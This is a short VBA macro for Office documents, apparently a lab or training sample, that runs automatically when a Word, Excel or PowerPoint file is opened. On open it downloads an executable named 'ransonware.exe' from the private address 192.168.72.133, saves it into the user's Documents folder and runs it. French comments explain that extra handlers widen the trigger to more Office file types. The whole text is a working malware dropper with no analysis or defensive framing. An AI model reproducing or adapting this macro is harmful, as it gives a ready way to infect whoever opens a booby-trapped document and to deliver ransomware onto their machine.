Sub Auto_Open()
    'Path where the malware is'
    Set oShell = CreateObject("WScript.Shell")
    Path = oShell.ExpandEnvironmentStrings("%HOMEPATH%")
    
    'Download Malware from a server'
    Dim xHttp: Set xHttp = CreateObject("Microsoft.XMLHTTP")
    Dim bStrm: Set bStrm = CreateObject("Adodb.Stream")
    xHttp.Open "GET", "http://192.168.72.133/ransonware.exe", False
    xHttp.Send
    
        With bStrm
            .Type = 1 '//binary
            .Open
            .write xHttp.responseBody
                .savetofile Path + "\Documents\ransonware.exe", 2 '//overwrite
        End With
    
    CreateObject("WScript.Shell").Run Path + "\Documents\ransonware.exe"
    
End Sub

'Ajoute la compatibilité PowerPoint et Excel,
'En utilisant les fonctions AutoOpen() et Workbook_Open()

Sub AutoOpen()
    Auto_Open
End Sub

Sub Workbook_Open()
    Auto_Open
End Sub
